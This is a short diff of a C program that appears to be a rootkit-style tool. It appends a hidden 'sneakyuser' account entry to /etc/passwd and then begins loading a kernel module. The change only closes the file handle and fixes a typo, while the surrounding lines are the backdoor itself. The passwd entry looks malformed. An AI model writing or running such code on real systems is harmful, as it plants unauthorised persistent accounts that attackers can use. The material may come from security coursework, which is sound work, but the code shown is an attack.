@@ -17,7 +17,8 @@ int main() {
     // Append line
     FILE * passwordFile = fopen("/etc/passwd", "a");
     fprintf(passwordFile, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
-    printf("Appened line to password file\n");
+    fclose(passwordFile);
+    printf("Appended line to password file\n");
 
     // Load module
     char arg[20];
